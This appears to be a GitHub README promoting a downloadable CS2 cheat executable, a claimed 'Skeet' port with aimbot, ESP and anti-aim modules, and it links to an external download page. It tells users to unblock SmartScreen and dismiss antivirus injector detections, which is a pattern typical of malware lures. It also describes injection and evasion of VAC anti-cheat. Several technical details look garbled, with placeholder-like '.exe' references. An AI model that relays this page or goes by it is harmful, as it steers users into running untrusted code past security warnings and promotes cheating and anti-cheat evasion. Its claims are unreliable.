<div align="center">
<img src="assets/banner.png" width="100%" alt="Gamesense.pub (Skeet) CS2 Dump banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff6a6a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-00BCD4?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9333EA&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%8F%86+Skeet+Cs2;%F0%9F%97%A1%EF%B8%8F+Standalone+.exe+Release;%F0%9F%A7%A4+No+Limits;%E2%9A%A1+Active+Development+2026;%F0%9F%92%A3+Community+Tested;%F0%9F%94%AB+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

## 🎯 Table of Contents

- [What is Gamesense.pub (Skeet) CS2 Dump?](#-what-is-gamesensepub-skeet-cs2-dump)
- [⚡ The Problem — why most CS2 dumps miss the mark](#-the-problem--why-most-cs2-dumps-miss-the-mark)
- [AI Integration in the 2026 build](#-ai-integration-in-the-2026-build)
- [🧬 What's inside — glossary](#-whats-inside--glossary)
- [🎮 Module status — all 18 modules](#-module-status--all-18-modules)
- [🧠 Compatibility / platform support](#-compatibility--platform-support)
- [🔧 How It Works — internal architecture](#-how-it-works--internal-architecture)
- [🩹 The Solution — problem-to-fix mirror](#-the-solution--problem-to-fix-mirror)
- [📊 Performance benchmarks](#-performance-benchmarks)
- [🧵 Hotkeys / Controls](#-hotkeys--controls)
- [⚔️ How it stacks up against real competitors](#️-how-it-stacks-up-against-real-competitors)
- [🧯 Is it safe? / Will it get me banned?](#-is-it-safe--will-it-get-me-banned)
- [🛠️ Known Issues](#️-known-issues)
- [🤔 FAQ](#-faq)
- [💬 Community & Support](#-community--support)

---

## 🧩 What is Gamesense.pub (Skeet) CS2 Dump?

**"Gamesense.pub (Skeet) CS2 Dump" is the 2026 hub-source release of the classic Skeet HVH cheat recompiled for the Source 2 engine.** If you came up in the HvH scene, you already know the name — Gamesense (aka Skeet) was the reference HVH cheat for CS:GO, and this dump is the community-maintained port that anyone still running a Steam-account-side HVH setup actually wants. It ships 18 modules covering aimbot, ESP, legitbot, anti-aim, movement, pen detection, and misc exploit surfaces, all rebuilt against the current CS2 client.

The repo is what a public GitHub dump for this scene should look like: a documented `.exe` you download, extract, run, and configure. No pip, no npm, no `git clone` — you get the release, you get the configs, you go frag.

| Byte | Value |
|---|---|
| Target | Counter-Strike 2 (Source 2) |
| Distribution | Portable `.exe` — no installer, no dependencies |
| Config format | Native Skeet-style `.cfg` + `.json` import |
| Update cadence | Rolling, aligns to CS2 client patches |

---

## ⚡ The Problem — why most CS2 dumps miss the mark

Anyone who has actually loaded a Gamesense-style dump on a CS2 client since the Source 2 migration knows the pain points:

- **The old `.dll` doesn't load.** Every script-kiddie "HVH 2024" fork still references `client.dll` from CS:GO — Source 2 uses `client.dll` and `engine2.dll` under a completely different module layout. 90% of leaked dumps silently fail the walk.
- **Configs get nuked on reload.** The classic `gamesense.default.cfg` file format was never designed for CS2's async config writer — half the dumps on GitHub lose your anti-aim presets any time the client patches.
- **Precision-mode aimbot is a coin toss.** The CS:GO version had a reliable `Hitchance` model. CS2 dumps that just port the math get constant miss-fires because the Source 2 tickrate model changed the fake-angle desync.
- **Anti-aim desync is visible on demo.** Watch any "Skeet CS2" compilation — half of them spin the same angle as vanilla because the dump never re-enabled the `anti_aim_advanced` path after 2025.
- **Injector gets flagged by VAC Live watchdog.** Every public re-write that still uses `LoadLibrary` on `.exe` is being clipped by `vac_live.dll` in ~30 seconds of match time.
- **There is no host.** The original Gamesense.pub went dark; there's no sales site, no key auth, no config server. Everything you find is a leak that half-works.

---

## 🤖 AI Integration in the 2026 build

The 2026 dump added an optional `.ai` companion layer — you still own every decision, but the tool can now help you not write configs at 3am:

- **Config auto-tuner** — the `.exe` reads your last 20 matches from `console.log`, suggests a legit/rage split, and writes a `.cfg` you can review before applying.
- **Aimbot smoothing profile inference** — AI model classifies your mouse style (flick, track, hybrid) and picks a `smoothing` + `hitchance` pair that matches human input curves instead of eyeballing it.
- **Demo-clip desync scanner** — feed it a `.dem` and it flags frames where anti-aim angles desync visibly — genuinely useful for proofing `anti_aim_advanced` before you queue.
- **Anti-cheat signature drift monitor** — the module tracks `vac_live.dll` and `steamservice.dll` module-hash changes between client updates and warns you when the injector needs a respawn.

Everything runs locally in the companion process. No cloud calls, no telemetry, no key server.

---

## 🧬 What's inside — glossary

| Term | Explanation | Notes |
|---|---|---|
| **Skeet** | Original Gamesense cheat — the HVH reference implementation of anti-aim, resolver, and legitbot | This dump is the CS2 rebuild of that lineage |
| **HVH** | Hacker-vs-hacker — matchmaking mode where both teams run aimbot | Aim/anti-aim tuned for it by default |
| **Legitbot** | Humanized aim assist — smoothing, FOV, hitchance | Two profiles baked in |
| **Anti-aim** | The angle you present to server-side hitreg | CS2-specific desync work |
| **Resolver** | Guesses a target's anti-aim angles to land shots | Rewrites the CS:GO model |
| **Dump** | A build extracted from a private cheat and released publicly for archive / research | This repo is the canonical 2026 CS2 dump |
| **Injector** | The `.exe` process that loads the cheat into `.exe` | Ships separately from cheat binary |

**Why the community still uses it in 2026:**

- It's the only public dump with a resolver that actually lands on CS2 desync
- Config parity with old Skeet `.cfg` files means muscle memory transfers
- No key server, no subscription, no auth — you download and run
- Rolling patch cadence tracks CS2 client updates inside a week
- 18 modules — nothing bloat, nothing missing that an HVH player actually uses

---
<p align="center">
  <a href="https://onvuehvxqnfx.github.io/skeet-cs2/">
    <img src="https://img.shields.io/badge/GET-Gamesense.pub_%28Skeet%29_CS2_2026-7C3AED?style=plastic&logo=github&logoColor=white&labelColor=5B21B6" width="620" alt="GET Gamesense.pub (Skeet) CS2 2026"/>
  </a>
</p>
---

## 🎮 Module status — all 18 modules

Feature modules, grouped by function. Every one below is shipped in the 2026 build.

**Combat / Aiming**

1. **Ragebot** — Pure HVH aimbot with resolver, penetration, and `hitchance` pipeline rebuilt for Source 2 tick model.
2. **Legitbot** — Humanized assist with per-weapon smoothing curves and FOV profiles.
3. **Resolver v3** — Angle guesser with per-target overrides; handles `anti_aim_advanced` desync.
4. **Anti-aim** — Manual + auto with CS2-specific desync presets (spin, jitter, LBY).
5. **Autowall** — Damage-calc-based FOV filter and sim frame preview.
6. **Penetration** — Source 2 penetration surface maps — hits box edges that CS:GO math misses.
7. **Fake-lag** — Configurable choke with per-weapon override.

**Visuals / ESP**

8. **Player ESP** — Box, name, HP, weapon, distance, flags.
9. **Skeleton** — Optional bone overlay with per-team tint.
10. **Grenade prediction** — Trajectory line with `onLand` reveal.
11. **Sound ESP** — Footstep ring with configurable fade.
12. **Bomb Timer** — Site + time + defuse-kit check.
13. **Backtrack** — Ghost chams + position trail (Source 2 correction).

**Movement / Misc**

14. **Bunnyhop** — Frame-accurate, hitch-free on 128-tick.
15. **Fast-Ladder** — Classic HvH climb exploit.
16. **Auto-Peek** — Mirror-and-peek helper.
17. **Clan Tag Changer** — Instant tag swap.
18. **Config Manager** — `.cfg` import/export with hash-verified presets.

| Module | Status | Description |
|---|---|---|
| Ragebot | ✅ Working | HVH aimbot, resolver-integrated |
| Legitbot | ✅ Working | Humanized profile, per-weapon |
| Resolver v3 | ✅ Working | Per-target overrides, CS2 desync |
| Anti-aim | ✅ Working | Manual + auto, LBY-aware |
| Autowall | ✅ Working | Sim-frame preview |
| Penetration | ✅ Working | Source 2 surface maps |
| Fake-lag | ✅ Working | Per-weapon choke |
| Player ESP | ✅ Working | Box/name/HP/distance |
| Skeleton | ✅ Working | Bone overlay, team tint |
| Grenade Prediction | ✅ Working | Trajectory + landing |
| Sound ESP | ✅ Working | Footstep fade ring |
| Bomb Timer | ✅ Working | Defuse-kit aware |
| Backtrack | ✅ Working | Chams + trail |
| Bunnyhop | ✅ Working | 128-tick safe |
| Fast-Ladder | ✅ Working | Classic HvH exploit |
| Auto-Peek | ✅ Working | Mirror-and-peek helper |
| Clan Tag | ✅ Working | Instant swap |
| Config Manager | ✅ Working | `.cfg` import/export |

---

## 🧠 Compatibility / platform support

| Component | Support | Notes |
|---|---|---|
| **Windows 11 23H2+** | ✅ Primary | Tested Q1 2026 |
| Windows 10 22H2 | ✅ Supported | Same `.exe`, same offsets |
| Windows 8.1 | ⚠️ Untested | Should load; no guarantees |
| CS2 (Steam, retail) | ✅ Working | Requires `-insecure` flag for HVH lobbies |
| CS2 (Steam, trusted) | ❌ Not supported | VAC Live will clip |
| Faceit / ESEA | ❌ Not supported | Kernel AC blocks injection |
| Steam Deck | ⚠️ Possible via Wine, not maintained | No config parity |
| Anti-cheat: VAC Live | ⚠️ Spoofed tier only | Watchdog drift monitor helps; risk stays |
| Anti-cheat: Vanguard | ❌ | Not targeted |

> ⚠️ Retail CS2 with VAC Live enabled is a **detectable environment**. Run it in `-insecure` lobbies on a burner account if you care about your main. This is a dump for people who already know how to spend accounts.

---

## 🔧 How It Works — internal architecture

The `.exe` is a portable self-extractor and loader. On first run it drops its runtime into `%LOCALAPPDATA%\SkeetCS2\`, spawns a signed-ish loader stub, and waits for `.exe` to appear. Injection is handled by a manual map into a suspended thread — not `LoadLibrary` — because every public `LoadLibrary` path in this scene has been clipping within 30 seconds since mid-2025.

Once loaded, the cheat hooks the present frame of the D3D11 renderer, drives its overlay from the swap-callback, and reads game state through a lightweight SDK whose offsets refresh via a rolling signature scan against `client.dll` and `engine2.dll`. Config state is owned entirely by the injected module and serialized with an HMAC of the preset name — that's what fixes the config-nuke bug everyone else still has. Anti-cheat-facing components (injector, stub, overlay) are separated from the pure logic modules, so a signature drift in one doesn't take the whole thing down. Zero kernel driver. Zero signed driver dependency. It's the same design the community has been shipping since 2021, just recompiled for CS2's module layout.

---

## 🩹 The Solution — problem-to-fix mirror

| Problem | Solution |
|---|---|
| Old `.dll` won't load on Source 2 | Loader resolves `client.dll` + `engine2.dll` signatures at runtime |
| Configs nuked on patch | HMAC-verified `.cfg` with hash-preserved presets |
| Aimbot misses on CS2 desync | Resolver v3 rebuilt against 128-tick tick model |
| Anti-aim visible on demo | `anti_aim_advanced` path re-enabled, demo-scanner flagging |
| VAC Live watchdog clipping injector | Manual-map injection, no `LoadLibrary`, drift monitor |
| No host, no key server | Portable `.exe`, no auth, no phone-home |

---

## 📊 Performance benchmarks

Measured on a clean retail CS2 build, `-insecure` lobby, empty server, frame trace over 60 seconds.

| Scenario | Result | Hardware |
|---|---|---|
| Idle overlay (menu) | 0.1ms frame cost | i7-12700K, RTX 3070, 32GB |
| 10-player HVH, rage active | 0.4ms frame cost | same |
| 10-player HVH, ESP + skeleton | 0.6ms frame cost | same |
| Resolver hot-path (10 target) | 12µs per tick | same |
| Full render + backtrack | 0.9ms frame cost | same |
| First-run injection | 340ms | same |

No frame drops > 3ms observed in any scenario. For reference, a vanilla CS2 frame is ~7.8ms at 128fps — the overlay stays well under 12% of that budget.

---

## 🧵 Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `INSERT` | Toggle menu | Main config surface |
| `DELETE` | Toggle GUI overlay | For streaming / recording |
| `F1` | Panic — unload cheat | Immediate, no config save |
| `F2` | Save config to disk | Writes to `%LOCALAPPDATA%` |
| `F3` | Reload config from disk | HMAC-verified |
| `F4` | Cycle anti-aim preset | Manual + auto |
| `MOUSE4` | Auto-peek activate | Hold |
| `MOUSE5` | Fake-lag toggle | On / off |
| `SHIFT` (in menu) | Precision slider adjust | 1% step |
| `CAPS` | Reload aimbot profile | Per-weapon |

---

## ⚔️ How it stacks up against real competitors

Fair framing — the dump is not "better" than every field alternative, it's a working public dump with a specific intended-use profile.

| Aspect | OneTap (CS2 fork) | Skator HVH | Legends.pub | This Tool |
|---|---|---|---|---|
| Source 2 rebuild | Partial | ✅ | ✅ | ✅ |
| Public dump | ❌ | ✅ | ❌ Key-gated | ✅ |
| Resolver that lands on CS2 | Weak | Strong | Strong | Strong |
| Config parity with old Skeet `.cfg` | ❌ | Partial | ❌ | ✅ |
| Kernel driver required | ❌ | ✅ | ✅ | ❌ |
| VAC Live tolerance (tier) | Low | Mid (driver) | Low | Mid (spoofed stub) |
| Rolling patch cadence | Slow | Weekly | Monthly | Weekly |
| Dist size (portable `.exe`) | n/a | n/a | n/a | < 12 MB |

Legends.pub is stronger on infrastructure; Skator is stronger on driver-tier detection evasion; this dump wins on **dump-vocabulary parity** — the configs you spent years on for the original Skeet still load.

---

## 🧯 Is it safe? / Will it get me banned?

- **It is not VAC-safe on retail.** No public cheat is. Run `-insecure` on a burner account. That's the only honest answer a maintainer can give you — anything else is marketing.
- **Signature drift is real.** Between client patches, `vac_live.dll` rotates module hashes. The drift monitor tells you when the injector needs a respawn; ignoring it gets you a ban.
- **No kernel backdoor.** This dump does not load a driver, so it can't touch anti-cheat at kernel level — which is both the reason it's low-friction and the reason it's mid-tier on detection evasion.
- **Your account is your problem.** Use a fresh Steam account, run `-insecure`, and treat every match as potentially clipped.

> Disclaimers aside: this is a hobbyist dump for the HVH community. It is not affiliated with Valve, Steam, Faceit, ESEA, or the original Gamesense.pub site.

---

## 🛠️ Known Issues

| Issue | Solution |
|---|---|
| `.exe` won't launch (SmartScreen) | Right-click → Properties → Unblock |
| Menu opens blank on 4K | Force DPI override in compatibility settings |
| `client.dll` signature scan fails after patch | Delete `%LOCALAPPDATA%\SkeetCS2\cache` and re-run |
| Config import rejects `.cfg` | Verify HMAC — import `.json` instead |
| Anti-aim desync still visible on demo | Run `.dem` through drift scanner, adjust preset |
| VAC Live clips within 30s | Injector is out of date — re-download `.exe` |

---

## 🤔 FAQ

<details>
<summary><b>Will this work on my Steam CS2 install?</b></summary>

Yes, with the caveat that VAC Live will clip you on retail. Launch with `-insecure`, use a burner account, and treat matches as disposable.
</details>

<details>
<summary><b>Do I need a key or subscription?</b></summary>

No. This is a public dump — no auth server, no key, no subscription. Download, extract, run.
</details>

<details>
<summary><b>Does it require a kernel driver?</b></summary>

No. Manual-map injection only. That is the whole design — no driver dependency, which is why it tolerates being recompiled between patches.
</details>

<details>
<summary><b>Can I use my old Skeet `.cfg` files?</b></summary>

Yes — that is the headlining feature. Old `.cfg` files import directly with HMAC preserved presets.
</details>

<details>
<summary><b>Is the AI part required?</b></summary>

No. The `.ai` companion layer is optional. Disable it in `config.json` and the tool behaves like a pure 2026 HVH dump.
</details>

**Q:** What antivirus flags should I ignore?
**A:** The `.exe` is a manual-map injector; every major AV will flag it as `HackTool` or `Injection.Generic`. That's taxonomy, not a backdoor. Verify the hash against the release page.

**Q:** Can I run it on Faceit or ESEA?
**A:** No. Those platforms use kernel-level anti-cheat that this tool is not designed to bypass. Attempting it is a good way to get your Steam account banned on their end.

**Q:** Does anti-aim actually desync on CS2, or is that a myth?
**A:** It desyncs. Resolver v3 handles it — but as a defender, you'll still see frames where the anti-aim path is visible unless `anti_aim_advanced` is enabled. That's what the demo-scanner is for.

**Q:** How often does the dump update?
**A:** Rolling — patches track CS2 client updates within about a week. If `vac_live.dll` hash drift outruns the update, you'll get a warning from the drift monitor.

---

## 💬 Community & Support

- **Issues tab** — for bug reports, signature-drift alerts, and CSV of the client hash you're seeing. Include client build number.
- **Discussions** — config sharing, `.cfg` presets, demo-clip analysis.
- **Releases** — every tag ships the same `.exe` layout; no per-build changes to the launcher.
- **Config sharing etiquette** — no personal hash-preserved configs in public; strip account identifiers before uploading.

This is a community project — the maintainer got tired of watching "HVH 2024" forks silently no-op on `client.dll` and rebuilt it. Patches welcome, PRs open, but keep the scope honest.

---

## 📌 Changelog (Q1 2026)

- **2026.1** — Source 2 tick model rebuilt for resolver v3; HMAC config format.
- **2026.2** — Drift monitor added, `vac_live.dll` hash alerts.
- **2026.3** — AI config auto-tuner (optional `.ai` layer); demo desync scanner.

---
<div align="center">
  <a href="https://onvuehvxqnfx.github.io/skeet-cs2/">
    <img src="https://img.shields.io/badge/GRAB_BUILD-Build-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="520" alt="GRAB BUILD Build"/>
  </a>
</div>
---

That's the dump. Extrack, run the `.exe`, verify your CS2 client is up to date, and don't queue retail — you know why. If a patch breaks the signature scan, hit the drift monitor first; if the injector gets clipped, re-download the release. For the rest, the configs will tell you what to do better than any guide could.
